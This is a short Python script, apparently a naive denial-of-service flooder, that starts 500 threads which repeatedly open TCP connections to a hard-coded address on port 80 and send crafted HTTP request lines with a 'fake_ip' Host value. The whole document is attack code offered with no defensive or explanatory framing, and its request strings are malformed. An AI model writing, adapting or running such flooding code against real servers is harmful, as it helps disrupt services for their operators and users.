import threading
import socket


target = "192.168.1.6"
port = 80
fake_ip = "182.21.20.32"
alreadyConnected = 0


def attack():
    while True:
        s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode(\
            'ascii'), (target, port))
        s.sendto(("HOST /" + fake_ip + "\r\n\r\n").encode(\
            'ascii'), (target, port))
        s.close()

        global alreadyConnected
        alreadyConnected += 1
        if not alreadyConnected % 500:
            print(alreadyConnected)


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
